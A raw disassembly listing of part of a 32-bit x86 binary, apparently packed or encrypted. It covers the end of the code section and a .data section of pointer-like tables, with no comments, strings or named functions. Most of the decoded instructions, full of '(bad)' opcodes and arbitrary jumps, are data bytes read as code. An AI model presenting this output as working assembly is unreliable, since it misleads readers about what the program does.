  411286:	btc    DWORD PTR [eax+0x15d00d2b],esi
  41128d:	cmp    ah,BYTE PTR [eax-0x696fcf74]
  411293:	and    ecx,DWORD PTR [eax+0x7cdb5871]
  411299:	scas   al,BYTE PTR es:[edi]
  41129a:	push   DWORD PTR [ebp+0xa518aed]
  4112a0:	(bad)  
  4112a1:	sbb    al,0x66
  4112a3:	mov    WORD PTR [edx+ebx*2-0x4d],cs
  4112a7:	(bad)  
  4112a9:	ret    
  4112aa:	mov    edx,0x1b8f2a6
  4112af:	addr16 je 0x411323
  4112b2:	push   ds
  4112b3:	leave  
  4112b4:	sahf   
  4112b5:	xor    dl,BYTE PTR [edi-0x7d21fe6e]
  4112bb:	mov    ?,WORD PTR ds:[ecx]
  4112be:	mov    dl,BYTE PTR [edx+0x51976c11]
  4112c4:	scas   al,BYTE PTR es:[edi]
  4112c5:	cmp    DWORD PTR [edi+0x2f3cc682],ebp
  4112cb:	sbb    DWORD PTR [esi],eax
  4112cd:	cdq    
  4112ce:	ror    DWORD PTR [edx+0x1e],1
  4112d1:	sub    BYTE PTR [edx+0x74477cf6],dl
  4112d7:	mov    ebp,0xb699d4fb
  4112dc:	dec    edi
  4112dd:	in     eax,dx
  4112de:	sub    DWORD PTR [eax+0x10433c55],ebp
  4112e4:	xchg   esp,eax
  4112e5:	push   ebp
  4112e6:	loope  0x4112b8
  4112e8:	lods   al,BYTE PTR ds:[esi]
  4112e9:	das    
  4112ea:	ins    DWORD PTR es:[edi],dx
  4112eb:	push   eax
  4112ec:	mov    esi,0x65ca3d20
  4112f1:	loopne 0x411327
  4112f3:	enter  0xba98,0x62
  4112f7:	fcomi  st,st(7)
  4112f9:	scas   al,BYTE PTR es:[edi]
  4112fa:	jl     0x41128e
  4112fc:	pop    eax
  4112fd:	jle    0x411367
  4112ff:	dec    ebx
  411300:	push   ds
  411301:	mov    al,ds:0x84e339f6
  411306:	js     0x4112e4
  411308:	cmp    al,0x73
  41130a:	pusha  
  41130b:	mov    al,0x29
  41130d:	mov    dl,0x8d
  41130f:	retf   
  411310:	div    eax
  411312:	jmp    DWORD PTR [ebx]
  411314:	jbe    0x4112f2
  411316:	loop   0x411386
  411318:	loope  0x411369
  41131a:	mov    ebx,0xab0d83c6
  41131f:	test   al,0x8a
  411321:	repz adc ebx,ebp
  411324:	inc    edi
  411325:	sub    eax,0x590a6a4c
  41132a:	push   0x4
  41132c:	pop    ebx
  41132d:	inc    ebx
  41132e:	xchg   ebx,ecx
  411330:	sub    ebx,ecx
  411332:	xchg   ebx,ecx
  411334:	dec    ecx
  411335:	mov    eax,DWORD PTR [ebp-0x1c]
  411338:	imul   eax,ecx
  41133b:	add    esp,eax
  41133d:	xchg   edx,eax
  41133e:	push   eax
  41133f:	xor    ebx,ebx
  411341:	mov    edx,esp
  411343:	jmp    0x41147e
  411348:	sub    BYTE PTR [edi+0x7165615e],cl
  41134e:	xor    ebx,DWORD PTR [ebp-0x7b]
  411351:	into   
  411352:	jge    0x411370
  411354:	mov    al,0x9b
  411356:	cmp    DWORD PTR [ebx],ebp
  411358:	dec    ebp
  411359:	inc    ebx
  41135a:	jl     0x4113d8
  41135c:	adc    bh,BYTE PTR [edi+0x7c]
  41135f:	jl     0x4113d3
  411361:	push   ecx
  411362:	xchg   edx,eax
  411363:	mov    ecx,0x229e6b48
  411368:	mov    bl,0x82
  41136a:	fdivr  QWORD PTR [edx+ebp*4]
  41136d:	mov    ebp,0x62163fdd
  411372:	jne    0x41136f
  411374:	gs (bad) 
  411376:	mov    al,ds:0xc950ad20
  41137b:	jmp    0x6a5e526d
  411380:	clc    
  411381:	mov    bh,0x74
  411383:	lock aas 
  411385:	mov    DWORD PTR [edi+0x3ed7161c],ebx
  41138b:	push   esi
  41138c:	push   ebx
  41138d:	sub    dh,BYTE PTR ds:0x44ce41f3
  411393:	mov    al,gs:0x8b85afc1
  411399:	repnz add DWORD PTR [eax+0x4353c242],ebx
  4113a0:	xchg   esi,eax
  4113a1:	repz cmc 
  4113a3:	mov    WORD PTR [eax+edx*2-0x26],cs
  4113a7:	and    eax,0xf3e85b24
  4113ac:	in     eax,dx
  4113ad:	push   cs
  4113ae:	sbb    ecx,eax
  4113b0:	test   eax,0xdcd0a397
  4113b5:	jae    0x4113aa
  4113b7:	cs in  al,0x99
  4113ba:	push   esp
  4113bb:	mov    al,ds:0xf795dae1
  4113c0:	push   esp
  4113c1:	out    dx,al
  4113c2:	popf   
  4113c3:	(bad)  
  4113c4:	gs test al,0x66
  4113c7:	cli    
  4113c8:	dec    esp
  4113c9:	cld    
  4113ca:	dec    ebx
  4113cb:	je     0x4113c6
  4113cd:	mov    esp,0x1e8ab519
  4113d2:	in     al,0x73
  4113d4:	nop
  4113d5:	xor    bl,BYTE PTR [eax-0x482d0840]
  4113db:	and    BYTE PTR [edi+0xc22ea5a],0xd5
  4113e2:	inc    edx
  4113e3:	shr    BYTE PTR [edx+0x75],1
  4113e6:	push   es
  4113e7:	loop   0x4113ae
  4113e9:	mov    bh,0xf3
  4113eb:	sub    BYTE PTR [edx],ah
  4113ed:	jge    0x411383
  4113ef:	lahf   
  4113f0:	jmp    0x47d75631
  4113f5:	sub    edx,ecx
  4113f7:	xor    DWORD PTR [edi+0x4f523f4b],esp
  4113fd:	pushf  
  4113fe:	add    eax,0x2963a093
  411403:	push   ds
  411404:	and    dl,bh
  411406:	push   ecx
  411407:	and    ebp,DWORD PTR [ecx]
  411409:	jmp    0x4113d5
  41140b:	sbb    BYTE PTR [esi+edi*2-0x25d90813],cl
  411412:	jmp    0xb3097b3b
  411417:	ret    
  411418:	adc    al,0x33
  41141a:	rcr    BYTE PTR [edi-0x6e12666e],cl
  411420:	(bad)  
  411421:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411422:	or     bl,BYTE PTR [esi+0x5ff6abcf]
  411428:	out    0xc5,al
  41142a:	xchg   ebx,eax
  41142b:	push   ebp
  41142c:	cwde   
  41142d:	jmp    0x4113db
  41142f:	dec    ecx
  411430:	pop    es
  411431:	and    DWORD PTR [edi+0xce875b6],ecx
  411437:	xchg   edi,eax
  411438:	pop    ecx
  411439:	mov    edx,0x860c36f3
  41143e:	sub    bh,ah
  411440:	cmp    BYTE PTR [edi-0x121386e7],bl
  411446:	fcmovbe st,st(2)
  411448:	xchg   edx,eax
  411449:	mov    ds:0x527fde79,eax
  41144e:	mov    al,ds:0x9dc9d9c1
  411453:	pop    esp
  411454:	out    dx,eax
  411455:	or     al,0xb3
  411457:	pushf  
  411458:	(bad)  
  411459:	push   edi
  41145a:	mov    ds:0x6a148f67,al
  41145f:	(bad)  
  411460:	aad    0xda
  411462:	push   cs
  411463:	and    eax,0xfa296778
  411468:	fs sub al,0x0
  41146b:	popf   
  41146c:	retf   0x49dd
  41146f:	adc    dl,BYTE PTR [ebx+0x34]
  411472:	dec    ebx
  411473:	mov    esp,0xc032de0
  411478:	add    eax,0xda1a250b
  41147d:	adc    DWORD PTR [edx+0x43],ecx
  411480:	add    ebx,DWORD PTR [edx+ebx*1]
  411483:	dec    ebx
  411484:	xor    edx,edx
  411486:	add    DWORD PTR [ebp-0xc],ebx
  411489:	pop    ebx
  41148a:	mov    eax,DWORD PTR [ebp-0xc]
  41148d:	pop    edi
  41148e:	pop    esi
  41148f:	pop    ebx
  411490:	leave  
  411491:	ret    0x10

Disassembly of section .data:

00412000 <.data>:
  412000:	and    BYTE PTR [ecx],ch
  412002:	add    DWORD PTR [eax],eax
  412004:	sub    ch,BYTE PTR [ecx]
  412006:	add    DWORD PTR [eax],eax
  412008:	xor    al,0x29
  41200a:	add    DWORD PTR [eax],eax
  41200c:	inc    eax
  41200d:	sub    DWORD PTR [ecx],eax
  41200f:	add    BYTE PTR [edx+0x29],cl
  412012:	add    DWORD PTR [eax],eax
  412014:	pop    eax
  412015:	sub    DWORD PTR [ecx],eax
  412017:	add    BYTE PTR [edx+0x29],ah
  41201a:	add    DWORD PTR [eax],eax
  41201c:	je     0x412047
  41201e:	add    DWORD PTR [eax],eax
  412020:	jle    0x41204b
  412022:	add    DWORD PTR [eax],eax
  412024:	mov    WORD PTR [ecx],gs
  412026:	add    DWORD PTR [eax],eax
  412028:	xchg   esi,eax
  412029:	sub    DWORD PTR [ecx],eax
  41202b:	add    BYTE PTR [esi-0x4ffffed7],ah
  412031:	sub    DWORD PTR [ecx],eax
  412033:	add    BYTE PTR [ecx+ebp*1+0x29c60001],bh
  41203a:	add    DWORD PTR [eax],eax
  41203c:	aam    0x29
  41203e:	add    DWORD PTR [eax],eax
  412040:	loopne 0x41206b
  412042:	add    DWORD PTR [eax],eax
  412044:	jmp    0x129:0xf2000129
  41204b:	add    BYTE PTR [eax],al
  41204d:	sub    al,BYTE PTR [ecx]
  41204f:	add    BYTE PTR [edx],cl
  412051:	sub    al,BYTE PTR [ecx]
  412053:	add    BYTE PTR [edx+ebp*1],dl
  412056:	add    DWORD PTR [eax],eax
  412058:	and    ch,BYTE PTR [edx]
  41205a:	add    DWORD PTR [eax],eax
  41205c:	sub    al,0x2a
  41205e:	add    DWORD PTR [eax],eax
  412060:	xor    al,0x2a
  412062:	add    DWORD PTR [eax],eax
  412064:	inc    eax
  412065:	sub    al,BYTE PTR [ecx]
  412067:	add    BYTE PTR [edx+0x2a],cl
  41206a:	add    DWORD PTR [eax],eax
  41206c:	push   esp
  41206d:	sub    al,BYTE PTR [ecx]
  41206f:	add    BYTE PTR [esi+0x2a],bl
  412072:	add    DWORD PTR [eax],eax
  412074:	data16 sub al,BYTE PTR [ecx]
  412077:	add    BYTE PTR [eax+0x2a],dh
  41207a:	add    DWORD PTR [eax],eax
  41207c:	jp     0x4120a8
  41207e:	add    DWORD PTR [eax],eax
  412080:	sub    BYTE PTR [edx],0x1
  412083:	add    BYTE PTR [esi-0x65fffed6],cl
  412089:	sub    al,BYTE PTR [ecx]
  41208b:	add    BYTE PTR [edx-0x53fffed6],ah
  412091:	sub    al,BYTE PTR [ecx]
  412093:	add    BYTE PTR [edx+ebp*1+0x2ac00001],dh
  41209a:	add    DWORD PTR [eax],eax
  41209c:	retf   0x12a
  41209f:	add    ah,dl
  4120a1:	sub    al,BYTE PTR [ecx]
  4120a3:	add    dh,bl
  4120a5:	sub    al,BYTE PTR [ecx]
  4120a7:	add    dl,dh
  4120a9:	sub    al,BYTE PTR [ecx]
  4120ab:	add    dh,bh
  4120ad:	sub    al,BYTE PTR [ecx]
  4120af:	add    BYTE PTR [eax],al
  4120b1:	add    BYTE PTR [eax],al
  4120b3:	add    BYTE PTR [edx],bl
  4120b5:	sub    eax,DWORD PTR [ecx]
  4120b7:	add    BYTE PTR [esi],ch
  4120b9:	sub    eax,DWORD PTR [ecx]
  4120bb:	add    BYTE PTR [esi],bh
  4120bd:	sub    eax,DWORD PTR [ecx]
  4120bf:	add    BYTE PTR [ebx+ebp*1+0x1],cl
  4120c3:	add    BYTE PTR [eax+0x2b],bl
  4120c6:	add    DWORD PTR [eax],eax
  4120c8:	push   0x7e00012b
  4120cd:	sub    eax,DWORD PTR [ecx]
  4120cf:	add    BYTE PTR [edx-0x59fffed5],dl
  4120d5:	sub    eax,DWORD PTR [ecx]
  4120d7:	add    BYTE PTR [ebx+ebp*1+0x2bca0001],bh
  4120de:	add    DWORD PTR [eax],eax
  4120e0:	loopne 0x41210d
  4120e2:	add    DWORD PTR [eax],eax
  4120e4:	in     al,dx
  4120e5:	sub    eax,DWORD PTR [ecx]
  4120e7:	add    dh,bh
  4120e9:	sub    eax,DWORD PTR [ecx]
  4120eb:	add    BYTE PTR [esi],dl
  4120ed:	sub    al,0x1
  4120ef:	add    BYTE PTR [eax],ch
  4120f1:	sub    al,0x1
  4120f3:	add    BYTE PTR [eax],bh
  4120f5:	sub    al,0x1
  4120f7:	add    BYTE PTR [edx+0x2c],al
  4120fa:	add    DWORD PTR [eax],eax
  4120fc:	pop    eax
  4120fd:	sub    al,0x1
  4120ff:	add    BYTE PTR [edx+0x2c],dh
  412102:	add    DWORD PTR [eax],eax
  412104:	jle    0x412132
  412106:	add    DWORD PTR [eax],eax
  412108:	mov    ch,BYTE PTR [ecx+eax*1]
  41210b:	add    BYTE PTR [esi-0x47fffed4],bl
  412111:	sub    al,0x1
  412113:	add    ah,al
  412115:	sub    al,0x1
  412117:	add    dl,dl
  412119:	sub    al,0x1
  41211b:	add    ah,ah
  41211d:	sub    al,0x1
  41211f:	add    al,dh
  412121:	sub    al,0x1
  412123:	add    BYTE PTR [esi],al
  412125:	sub    eax,0x2d140001
  41212a:	add    DWORD PTR [eax],eax
  41212c:	and    ch,BYTE PTR ds:0x2d300001
  412132:	add    DWORD PTR [eax],eax
  412134:	dec    edx
  412135:	sub    eax,0x2d5e0001
  41213a:	add    DWORD PTR [eax],eax
  41213c:	push   0x2d
  41213e:	add    DWORD PTR [eax],eax
  412140:	jp     0x41216f
  412142:	add    DWORD PTR [eax],eax
  412144:	xchg   esi,eax
  412145:	sub    eax,0x2da60001
  41214a:	add    DWORD PTR [eax],eax
  41214c:	mov    dh,0x2d
  41214e:	add    DWORD PTR [eax],eax
  412150:	(bad)  
  412151:	sub    eax,0x2dd20001
  412156:	add    DWORD PTR [eax],eax
  412158:	loop   0x412187
  41215a:	add    DWORD PTR [eax],eax
  41215c:	hlt    
  41215d:	sub    eax,0x2dfe0001
  412162:	add    DWORD PTR [eax],eax
  412164:	push   cs
  412165:	add    DWORD PTR cs:[eax],eax
  412168:	push   ds
  412169:	add    DWORD PTR cs:[eax],eax
  41216c:	sub    BYTE PTR [esi],ch
  41216e:	add    DWORD PTR [eax],eax
  412170:	add    BYTE PTR [eax],al
  412172:	add    BYTE PTR [eax],al
  412174:	dec    edx
  412175:	add    DWORD PTR cs:[eax],eax
  412178:	add    BYTE PTR [eax],al
  41217a:	add    BYTE PTR [eax],al
  41217c:	push   0x8000012e
  412181:	add    DWORD PTR cs:[eax],eax
  412184:	mov    WORD PTR [esi],gs
  412186:	add    DWORD PTR [eax],eax
  412188:	call   0x12e:0xb200012e
  41218f:	add    dh,al
  412191:	add    DWORD PTR cs:[eax],eax
  412194:	fsubr  QWORD PTR [esi]
  412196:	add    DWORD PTR [eax],eax
  412198:	call   0xf84122cb
  41219d:	add    DWORD PTR cs:[eax],eax
  4121a0:	adc    BYTE PTR [edi],ch
  4121a2:	add    DWORD PTR [eax],eax
  4121a4:	push   ds
  4121a5:	das    
  4121a6:	add    DWORD PTR [eax],eax
  4121a8:	xor    BYTE PTR [edi],ch
  4121aa:	add    DWORD PTR [eax],eax
  4121ac:	inc    eax
  4121ad:	das    
  4121ae:	add    DWORD PTR [eax],eax
  4121b0:	push   esi
  4121b1:	das    
  4121b2:	add    DWORD PTR [eax],eax
  4121b4:	data16 das 
  4121b6:	add    DWORD PTR [eax],eax
  4121b8:	jbe    0x4121e9
  4121ba:	add    DWORD PTR [eax],eax
  4121bc:	mov    ch,BYTE PTR [edi]
  4121be:	add    DWORD PTR [eax],eax
  4121c0:	xchg   esi,eax
  4121c1:	das    
  4121c2:	add    DWORD PTR [eax],eax
  4121c4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4121c5:	das    
  4121c6:	add    DWORD PTR [eax],eax
  4121c8:	mov    dl,0x2f
  4121ca:	add    DWORD PTR [eax],eax
  4121cc:	enter  0x12f,0x0
  4121d0:	loopne 0x412201
  4121d2:	add    DWORD PTR [eax],eax
  4121d4:	hlt    
  4121d5:	das    
  4121d6:	add    DWORD PTR [eax],eax
  4121d8:	add    dh,BYTE PTR [eax]
  4121da:	add    DWORD PTR [eax],eax
  4121dc:	sbb    BYTE PTR [eax],dh
  4121de:	add    DWORD PTR [eax],eax
  4121e0:	xor    BYTE PTR cs:[ecx],al
  4121e3:	add    BYTE PTR [edx],bh
  4121e5:	xor    BYTE PTR [ecx],al
  4121e7:	add    BYTE PTR [eax+0x30],cl
  4121ea:	add    DWORD PTR [eax],eax
  4121ec:	push   edx
  4121ed:	xor    BYTE PTR [ecx],al
  4121ef:	add    BYTE PTR [esi+0x30],ah
  4121f2:	add    DWORD PTR [eax],eax
  4121f4:	jbe    0x412226
  4121f6:	add    DWORD PTR [eax],eax
  4121f8:	mov    dh,BYTE PTR [eax]
  4121fa:	add    DWORD PTR [eax],eax
  4121fc:	pushf  
  4121fd:	xor    BYTE PTR [ecx],al
  4121ff:	add    BYTE PTR [eax-0x3bfffed0],dh
  412205:	xor    BYTE PTR [ecx],al
  412207:	add    ah,dl
  412209:	xor    BYTE PTR [ecx],al
  41220b:	add    dl,ch
  41220d:	xor    BYTE PTR [ecx],al
  41220f:	add    BYTE PTR [edx],al
  412211:	xor    DWORD PTR [ecx],eax
  412213:	add    BYTE PTR [edx],bl
  412215:	xor    DWORD PTR [ecx],eax
  412217:	add    BYTE PTR [esi],ah
  412219:	xor    DWORD PTR [ecx],eax
  41221b:	add    BYTE PTR [eax],bh
  41221d:	xor    DWORD PTR [ecx],eax
  41221f:	add    BYTE PTR [edx+0x31],cl
  412222:	add    DWORD PTR [eax],eax
  412224:	push   esi
  412225:	xor    DWORD PTR [ecx],eax
  412227:	add    BYTE PTR [eax+0x31],ch
  41222a:	add    DWORD PTR [eax],eax
  41222c:	jbe    0x41225f
  41222e:	add    DWORD PTR [eax],eax
  412230:	xor    BYTE PTR [ecx],0x1
  412233:	add    BYTE PTR [esi-0x59fffecf],dl
  412239:	xor    DWORD PTR [ecx],eax
  41223b:	add    BYTE PTR [eax-0x2dfffecf],bh
  412241:	xor    DWORD PTR [ecx],eax
  412243:	add    dl,ch
  412245:	xor    DWORD PTR [ecx],eax
  412247:	add    BYTE PTR [eax],al
  412249:	add    BYTE PTR [eax],al
  41224b:	add    BYTE PTR [esi],al
  41224d:	xor    al,BYTE PTR [ecx]
  41224f:	add    BYTE PTR [edx+esi*1],bl
  412252:	add    DWORD PTR [eax],eax
  412254:	xor    dh,BYTE PTR [edx]
  412256:	add    DWORD PTR [eax],eax
  412258:	inc    edx
  412259:	xor    al,BYTE PTR [ecx]
  41225b:	add    BYTE PTR [edx+0x32],dl
  41225e:	add    DWORD PTR [eax],eax
  412260:	pusha  
  412261:	xor    al,BYTE PTR [ecx]
  412263:	add    BYTE PTR [eax+0x32],dh
  412266:	add    DWORD PTR [eax],eax
  412268:	test   BYTE PTR [edx],dh
  41226a:	add    DWORD PTR [eax],eax
  41226c:	xchg   esp,eax
  41226d:	xor    al,BYTE PTR [ecx]
  41226f:	add    BYTE PTR [eax-0x41fffece],ch
  412275:	xor    al,BYTE PTR [ecx]
  412277:	add    ah,cl
  412279:	xor    al,BYTE PTR [ecx]
  41227b:	add    al,ah
  41227d:	xor    al,BYTE PTR [ecx]
  41227f:	add    al,dh
  412281:	xor    al,BYTE PTR [ecx]
  412283:	add    BYTE PTR [edx],al
  412285:	xor    eax,DWORD PTR [ecx]
  412287:	add    BYTE PTR [edx],bl
  412289:	xor    eax,DWORD PTR [ecx]
  41228b:	add    BYTE PTR [esi],ah
  41228d:	xor    eax,DWORD PTR [ecx]
  41228f:	add    BYTE PTR [ebx+esi*1],dh
  412292:	add    DWORD PTR [eax],eax
  412294:	inc    esp
  412295:	xor    eax,DWORD PTR [ecx]
  412297:	add    BYTE PTR [edx+0x33],dl
  41229a:	add    DWORD PTR [eax],eax
  41229c:	push   0x7a000133
  4122a1:	xor    eax,DWORD PTR [ecx]
  4122a3:	add    BYTE PTR [esi-0x6bfffecd],al
  4122a9:	xor    eax,DWORD PTR [ecx]
  4122ab:	add    BYTE PTR [esi-0x4bfffecd],ah
  4122b1:	xor    eax,DWORD PTR [ecx]
  4122b3:	add    dh,al
  4122b5:	xor    eax,DWORD PTR [ecx]
  4122b7:	add    al,bl
  4122b9:	xor    eax,DWORD PTR [ecx]
  4122bb:	add    dl,ch
  4122bd:	xor    eax,DWORD PTR [ecx]
  4122bf:	add    dl,bh
  4122c1:	xor    eax,DWORD PTR [ecx]
  4122c3:	add    BYTE PTR [esi],al
  4122c5:	xor    al,0x1
  4122c7:	add    BYTE PTR [esp+esi*1],bl
  4122ca:	add    DWORD PTR [eax],eax
  4122cc:	cmp    BYTE PTR [ecx+eax*1],dh
  4122cf:	add    BYTE PTR [edx+0x34],dl
  4122d2:	add    DWORD PTR [eax],eax
  4122d4:	data16 xor al,0x1
  4122d7:	add    BYTE PTR [esp+esi*1+0x1],dh
  4122db:	add    BYTE PTR [eax-0x6dfffecc],al
  4122e1:	xor    al,0x1
  4122e3:	add    BYTE PTR [edx-0x51fffecc],ah
  4122e9:	xor    al,0x1
  4122eb:	add    BYTE PTR [edx-0x37fffecc],bh
  4122f1:	xor    al,0x1
  4122f3:	add    al,ah
  4122f5:	xor    al,0x1
  4122f7:	add    al,dh
  4122f9:	xor    al,0x1
  4122fb:	add    BYTE PTR [eax],cl
  4122fd:	xor    eax,0x351a0001
  412302:	add    DWORD PTR [eax],eax
  412304:	sub    dh,BYTE PTR ds:0x35380001
  41230a:	add    DWORD PTR [eax],eax
  41230c:	dec    edx
  41230d:	xor    eax,0x35580001
  412312:	add    DWORD PTR [eax],eax
  412314:	fs xor eax,0x35720001
  41231a:	add    DWORD PTR [eax],eax
  41231c:	jl     0x412353
  41231e:	add    DWORD PTR [eax],eax
  412320:	xchg   esp,eax
  412321:	xor    eax,0x35a40001
  412326:	add    DWORD PTR [eax],eax
  412328:	mov    ah,0x35
  41232a:	add    DWORD PTR [eax],eax
  41232c:	ret    0x135
  41232f:	add    al,dl
  412331:	xor    eax,0x35e00001
  412336:	add    DWORD PTR [eax],eax
  412338:	div    BYTE PTR ds:0x36080001
  41233e:	add    DWORD PTR [eax],eax
  412340:	push   ss
  412341:	add    DWORD PTR ss:[eax],eax
  412344:	sub    al,0x36
  412346:	add    DWORD PTR [eax],eax
  412348:	cmp    dh,BYTE PTR [esi]
  41234a:	add    DWORD PTR [eax],eax
  41234c:	push   edx
  41234d:	add    DWORD PTR ss:[eax],eax
  412350:	pop    esi
  412351:	add    DWORD PTR ss:[eax],eax
  412354:	push   0x36
  412356:	add    DWORD PTR [eax],eax
  412358:	jbe    0x412390
  41235a:	add    DWORD PTR [eax],eax
  41235c:	test   BYTE PTR [esi],dh
  41235e:	add    DWORD PTR [eax],eax
  412360:	xchg   esi,eax
  412361:	add    DWORD PTR ss:[eax],eax
  412364:	mov    ds:0xb4000136,al
  412369:	add    DWORD PTR ss:[eax],eax
  41236c:	shl    BYTE PTR [esi],0x1
  41236f:	add    dh,cl
  412371:	add    DWORD PTR ss:[eax],eax
  412374:	fdiv   QWORD PTR [esi]
  412376:	add    DWORD PTR [eax],eax
  412378:	call   0xf64124b3
  41237d:	add    DWORD PTR ss:[eax],eax
  412380:	add    al,0x37
  412382:	add    DWORD PTR [eax],eax
  412384:	adc    al,0x37
  412386:	add    DWORD PTR [eax],eax
  412388:	es aaa 
  41238a:	add    DWORD PTR [eax],eax
  41238c:	cmp    al,0x37
  41238e:	add    DWORD PTR [eax],eax
  412390:	inc    esi
  412391:	aaa    
  412392:	add    DWORD PTR [eax],eax
  412394:	push   esp
  412395:	aaa    
  412396:	add    DWORD PTR [eax],eax
  412398:	fs aaa 
  41239a:	add    DWORD PTR [eax],eax
  41239c:	jbe    0x4123d5
  41239e:	add    DWORD PTR [eax],eax
  4123a0:	test   BYTE PTR [edi],dh
  4123a2:	add    DWORD PTR [eax],eax
  4123a4:	cwde   
  4123a5:	aaa    
  4123a6:	add    DWORD PTR [eax],eax
  4123a8:	mov    dl,0x37
  4123aa:	add    DWORD PTR [eax],eax
  4123ac:	les    esi,FWORD PTR [edi]
  4123ae:	add    DWORD PTR [eax],eax
  4123b0:	aam    0x37
  4123b2:	add    DWORD PTR [eax],eax
  4123b4:	call   0xfa4124f0
  4123b9:	aaa    
  4123ba:	add    DWORD PTR [eax],eax
  4123bc:	or     bh,BYTE PTR [eax]
  4123be:	add    DWORD PTR [eax],eax
  4123c0:	push   ss
  4123c1:	cmp    BYTE PTR [ecx],al
  4123c3:	add    BYTE PTR [eax+edi*1],dh
  4123c6:	add    DWORD PTR [eax],eax
  4123c8:	inc    esi
  4123c9:	cmp    BYTE PTR [ecx],al
  4123cb:	add    BYTE PTR [eax+edi*1+0x1],bl
  4123cf:	add    BYTE PTR [eax+0x38],bh
  4123d2:	add    DWORD PTR [eax],eax
  4123d4:	nop
  4123d5:	cmp    BYTE PTR [ecx],al
  4123d7:	add    BYTE PTR [eax+edi*1+0x38b00001],bl
  4123de:	add    DWORD PTR [eax],eax
  4123e0:	mov    edx,0xc8000138
  4123e5:	cmp    BYTE PTR [ecx],al
  4123e7:	add    ah,ah
  4123e9:	cmp    BYTE PTR [ecx],al
  4123eb:	add    dl,dh
  4123ed:	cmp    BYTE PTR [ecx],al
  4123ef:	add    BYTE PTR [esi],al
  4123f1:	cmp    DWORD PTR [ecx],eax
  4123f3:	add    BYTE PTR [eax],bl
  4123f5:	cmp    DWORD PTR [ecx],eax
  4123f7:	add    BYTE PTR [edx],ch
  4123f9:	cmp    DWORD PTR [ecx],eax
  4123fb:	add    BYTE PTR [edx],bh
  4123fd:	cmp    DWORD PTR [ecx],eax
  4123ff:	add    BYTE PTR [eax+0x39],dl
  412402:	add    DWORD PTR [eax],eax
  412404:	cmp    WORD PTR [ecx],ax
	...
  41240f:	add    dh,cl
  412411:	add    al,cl
  412413:	dec    ebp
  412414:	add    BYTE PTR [eax],al
  412416:	add    BYTE PTR [eax],al
  412418:	add    al,BYTE PTR [eax]
  41241a:	add    BYTE PTR [eax],al
  41241c:	dec    ebp
  41241d:	add    BYTE PTR [eax],al
  41241f:	add    BYTE PTR [edx-0x45fffcc6],bh
  412425:	and    al,0x3
	...
  41242f:	add    dh,cl
  412431:	add    al,cl
  412433:	dec    ebp
  412434:	add    BYTE PTR [eax],al
  412436:	add    BYTE PTR [eax],al
  412438:	pop    esi
  412439:	and    al,0x1
  41243b:	add    BYTE PTR [ecx],al
  41243d:	add    BYTE PTR [eax],al
  41243f:	add    BYTE PTR [ecx],al
  412441:	add    BYTE PTR [eax],al
  412443:	add    BYTE PTR [ecx],al
  412445:	add    BYTE PTR [eax],al
  412447:	add    BYTE PTR [esp+0x1],dl
  41244b:	add    BYTE PTR [eax+0x24],bl
  41244e:	add    DWORD PTR [eax],eax
  412450:	pop    esp
  412451:	and    al,0x1
  412453:	add    BYTE PTR [esi+0x6f000032],al
  412459:	and    al,0x1
  41245b:	add    BYTE PTR [eax],al
  41245d:	add    BYTE PTR [esi+0x64],ch
  412460:	jae    0x4124d4
  412462:	bound  esp,QWORD PTR [esi+0x64]
  412465:	push   edi
  412466:	inc    si
  412468:	popa   
  412469:	xor    al,0x2e
  41246b:	je     0x4124dc
  41246d:	jo     0x41246f
  41246f:	aas    
  412470:	dec    eax
  412471:	imul   esp,DWORD PTR [ebp+eiz*2+0x50],0x746e696f
  412479:	gs jb  0x4124cb
  41247c:	jb     0x4124e7
  41247e:	imul   ebp,DWORD PTR [bp+0x61],0x5940406c
  412486:	inc    edi
  412487:	inc    esi
  412488:	dec    ebx
  412489:	push   eax
  41248a:	inc    ecx
  41248b:	dec    ecx
  41248c:	push   eax
  41248d:	inc    ecx
  41248e:	inc    esp
  41248f:	cmp    al,0x56
	...
  412499:	add    BYTE PTR [eax],al
  41249b:	add    BYTE PTR [eiz*1+0x1],dl
  4124a2:	add    BYTE PTR [eax],al
  4124a4:	add    BYTE PTR [eax],al
  4124a6:	add    BYTE PTR [eax],al
  4124a8:	push   cs
  4124a9:	sub    eax,DWORD PTR [ecx]
  4124ab:	add    BYTE PTR [eax],al
  4124ad:	and    BYTE PTR [ecx],al
  4124af:	add    al,cl
  4124b1:	and    eax,0x1
  4124b6:	add    BYTE PTR [eax],al
  4124b8:	add    BYTE PTR [eax],al
  4124ba:	add    BYTE PTR [eax],al
  4124bc:	inc    eax
  4124bd:	add    DWORD PTR cs:[eax],eax
  4124c0:	mov    ah,0x20
  4124c2:	add    DWORD PTR [eax],eax
  4124c4:	mov    BYTE PTR [esi],ah
  4124c6:	add    DWORD PTR [eax],eax
	...
  4124d0:	pop    esp
  4124d1:	add    DWORD PTR cs:[eax],eax
  4124d4:	je     0x4124f7
  4124d6:	add    DWORD PTR [eax],eax
  4124d8:	nop
  4124d9:	add    DWORD PTR es:[eax],eax
	...
  4124e4:	clc    
  4124e5:	xor    DWORD PTR [ecx],eax
  4124e7:	add    BYTE PTR [ecx+eiz*1+0x1],bh
  4124eb:	add    BYTE PTR [eax+0x27],ah
  4124ee:	add    DWORD PTR [eax],eax
	...
  4124f8:	jb     0x412533
  4124fa:	add    DWORD PTR [eax],eax
  4124fc:	dec    esp
  4124fd:	and    al,BYTE PTR [ecx]
	...
  412513:	add    BYTE PTR [eax],ah
  412515:	sub    DWORD PTR [ecx],eax
  412517:	add    BYTE PTR [edx],ch
  412519:	sub    DWORD PTR [ecx],eax
  41251b:	add    BYTE PTR [ecx+ebp*1],dh
  41251e:	add    DWORD PTR [eax],eax
  412520:	inc    eax
  412521:	sub    DWORD PTR [ecx],eax
  412523:	add    BYTE PTR [edx+0x29],cl
  412526:	add    DWORD PTR [eax],eax
  412528:	pop    eax
  412529:	sub    DWORD PTR [ecx],eax
  41252b:	add    BYTE PTR [edx+0x29],ah
  41252e:	add    DWORD PTR [eax],eax
  412530:	je     0x41255b
  412532:	add    DWORD PTR [eax],eax
  412534:	jle    0x41255f
  412536:	add    DWORD PTR [eax],eax
  412538:	mov    WORD PTR [ecx],gs
  41253a:	add    DWORD PTR [eax],eax
  41253c:	xchg   esi,eax
  41253d:	sub    DWORD PTR [ecx],eax
  41253f:	add    BYTE PTR [esi-0x4ffffed7],ah
  412545:	sub    DWORD PTR [ecx],eax
  412547:	add    BYTE PTR [ecx+ebp*1+0x29c60001],bh
